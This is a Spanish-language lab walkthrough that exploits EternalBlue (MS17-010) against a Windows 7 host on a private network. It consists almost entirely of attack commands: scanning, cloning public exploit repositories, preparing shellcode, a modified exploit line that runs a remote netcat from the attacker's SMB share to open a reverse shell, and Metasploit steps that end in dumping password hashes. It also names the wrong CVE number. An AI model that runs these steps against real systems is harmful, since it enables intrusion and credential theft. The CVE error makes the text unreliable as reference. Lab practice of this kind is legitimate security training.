## Summary

Tags: #Windows #EternalBlue #SMB #RPC #Metasploit #RCE #Msfvenom #ReverShell 

- IP -> 192.168.68.110
- Ports -> TCP (135,139,445,49152,49153,49154,49155,49156,49157), UDP (idk)
- OS ->  Windows 7 ultimate 7601 Service Pack 1
- Services & Applications
    - 135 ->  RPC
    - 139 -> SMB
    - 445 -> SMB

## Recon

```bash
❯ arp-scan -I ens33 --localnet --ignoredups              # Para hacer un escaneo de la red 

	# I = i mayuscula; es la interface ens33
	# ignoredups = Ignora IPs duplicadas 
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts
```

```bash
❯ nmap -sCV -p20,... ❮Target IP❯ -oN targeted
```

```bash
❯ nmap --script "vuln and safe" -p445 ❮Target IP❯ -oN smbVulnScan   # Para ver si este servicio es vulnerable al ethernalblue (ms17-010) en Windows 7.
```
Encontramos que es vulnerable al EthernalBlue **CVE-2017-1043** en donde podemos hacer **RCE (Ejecucion Remota de Comandos)**

* De la manera manual
* [EternalBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)
```bash
❯ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git        # Nos clonamos un repositorio de Github
```

Entramos al dir **AutoBlue-MS17-010**
```bash
❯ pip install -r requirements.txt                                   # Instalamos los requerimientos para poder usar el exploit del EternalBlue 
```

```python
❯ python2.7 eternal_checker.py 192.168.68.110                      # Con el checker podemos ver que campos son vulnerables

	# Nos muestra que el Target is not patched
```
Una vez que sabemos que es vulnerable, entramos al dir **Shellcode** en donde haremos lo siguiente:

```bash
❯ ./shell_prep.sh                          # Ejecutamos el binario para crear un msfvenom y podamos tener una ReverShell

	# Colocaremos nuestra LHOST
	# Colocaremos nuestro puerto de escucha LPORT x64
	# Colocaremos nuestro puerto de escucha LPORT x86
	# Usaremos una 'Regular cmd Shell'
	# Usaremos 'Staged Payload'
	
```

Nos regresamos al dir anterior **AutoBlue-MS17-010** y ejecutamos lo siguiente:
```bash
❯ ./listener_prep.sh                # Nos ponemos en escucha 

	# Colocaremos nuestra LHOST
	# Colocaremos nuestro puerto de escucha LPORT x64
	# Colocaremos nuestro puerto de escucha LPORT x86
	# Usaremos una 'Regular cmd Shell'
	# Usaremos 'Staged Payload'
```

O podemos usar:
```bash
❯ rlwrap nc -nlvp 443               # Nos ponemos en esucha por el puerto que le colocamos en el shell_prep.sh
```

Y dolo queda ejecutar el exploit para tener la ReverShell
```python
❯ python2.7 eternalblue_exploit7.py 192.168.68.110 shellcode/sc_all.bin            # Ejecutamos el exploit
```
Ahora somos **NT Authority\\System** 


[MS17-010](https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py) De otra pagina por si la anterior no funciona 
```bash
❯ git clone https://github.com/worawit/MS17-010       # Nos clonamos un repositorio de Github
```

Entramos al dir **MS17-010**
```python
❯ python2.7 checker.py 192.168.68.110                                  # Usamos el Checker y nos saldra los STATUS OBJECT NAME que podremos usar despues

	# Dentro del checker.py debemos de agregar en Username='guest', para que no nos salga ACCESS_DENIED 
```

Ahora modificamos el archivo zzz_exploit.py
```python
❯ python2.7 zzz_exploit.py 192.168.68.110 samr                         # Usaremos un STATUS OBJECT NAME para hacer la explotacion

	# Dentro del zzz_exploit.py debemos de hacer los siguientes cambios:

	# Username='guest'
	# Donde esta la funcion 'def smb_pwn(conn, arch)', debemos de comentar lo siguiente:
		# print('Creating file')
		# tid2 
		# fid2 
		# smbConn.close
		# smbConn.disconnect
	# Tambien debemos de descomentar y colocar lo siguiente:
		# service_exec(conn, r'cmd /c \\192.168.68.109\smbFolder\nc.exe -e cmd 192.168.68.109 443') para obtener la ReverShell, IP y puerto de la maquina de atacante
```

Buscamos el Netcat en nuestra maquina de atacante
```bash
❯ locate nc.exe                              # Buscar el Netcat para Windows
```

Antes de ejecutar el binario, nos creamos un acceso compartido en donde tendremos el Netcat para Windows '**nc.exe**'
```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un servicio con SMB 

	# smbFolder = Nos creara un servicio compartido llamado 'smbFolder'
	# pwd = Sincronizado con la ruta absoluta actual 
	# smb2support = En Windows 10 le damos soporte a la version 2
```

Y nos ponemos en escucha
```bash
❯ rlwrap nc -nlvp 443
```
Ahora somos **NT Authority\\System** 

## User


## Root

* Usando MetaSploit
```bash 
❯ msfconsole -q         # q = Quitar el banner de inicio

❯ search eternalblue    # Buscamos el sploit (Los 'auxiliary' son mas para chequeo que un ataque, por lo que debemos de seleccionar el que dice 'exploit')
❯ use exploit/windows/smb/ms17_010_eternalBlue  # Colocamos el numero del exploit que vamos a usar
❯ options               # Miramos las opciones del exploit y lo que debemos de configurar
❯ set RHOSTS 192.168.68.110  # Configuramos el IP remoto (maquina victima)
❯ set payload windows/64/meterpreter/reverse_tcp    # Colocamos la ruta del Payload a usar
❯ set LHOST ens33       # Configuramos el IP local eth0, ens33 (Si estamos en una VPN colocar el Tun0)
❯ run                   # Ejecutamos el exploit  

#Dentro de la maquina podemos hacer lo siguiente
❯ hashdump              # Nos muestra los hashes de todos los usuarios
❯ shell                 # Dentro del exploit con shell nos podemos conseguir una consola interactiva
```
Ahora somos **NT Authority\\System** 